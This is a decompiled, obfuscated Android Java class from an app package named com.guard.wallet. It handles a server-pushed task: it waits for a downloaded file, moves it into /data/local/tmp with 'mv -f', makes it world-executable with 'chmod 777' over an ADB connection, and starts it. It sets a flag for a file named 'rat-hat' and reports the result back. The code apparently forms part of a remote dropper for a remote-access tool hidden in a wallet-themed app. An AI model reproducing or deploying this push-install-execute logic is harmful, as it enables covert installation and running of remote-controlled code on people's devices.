package h;

import a1.q;
import com.guard.wallet.http.l;
import com.guard.wallet.resp.PushResponseVO;
import com.guard.wallet.utils.h;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;

// $VF: synthetic class
public final class b implements Runnable {
   public final e a;
   public final String b;
   public final String c;
   public final String d;
   public final Future e;
   public final String f;

   @Override
   public final void run() {
      e var5 = this.a;
      var5.getClass();
      PushResponseVO var4 = new PushResponseVO();
      var4.setLogId(this.b);
      String var3 = this.c;
      var4.setFileUrl(var3);
      var4.setInstallMethod(0);
      String var6 = this.d;
      String var7 = "/data/local/tmp/".concat(var6);

      Future var2;
      do {
         var2 = this.e;
      } while (!var2.isDone());

      label40: {
         try {
            var12 = (String)var2.get();
            break label40;
         } catch (ExecutionException var9) {
            var11 = var9;
         } catch (InterruptedException var10) {
            var11 = var10;
         }

         q.s("AdbConnectionManager", (Exception)var11);
         var12 = null;
      }

      boolean var1 = q.B(var12);
      ConcurrentHashMap var8 = var5.r;
      if (var1) {
         if (!q.B(var3)) {
            var8.remove(var3);
         }
      } else {
         String var13 = "mv".concat(" -f ").concat(var12).concat(" ").concat(var7);
         var7 = "chmod".concat(" ").concat("777").concat(" ").concat(var7);
         if (var5.N(var13) && var5.N(var7)) {
            var4.setInstallResult(1);
            if (Objects.equals(var6, "rat-hat")) {
               h.z(true);
            }

            String var14 = this.f;
            if (!q.B(var14)) {
               var5.O(var14);
               var4.setStartResult(1);
            }
         }

         if (!q.B(var3)) {
            var8.remove(var3);
         }

         l.s(var4);
      }
   }
}
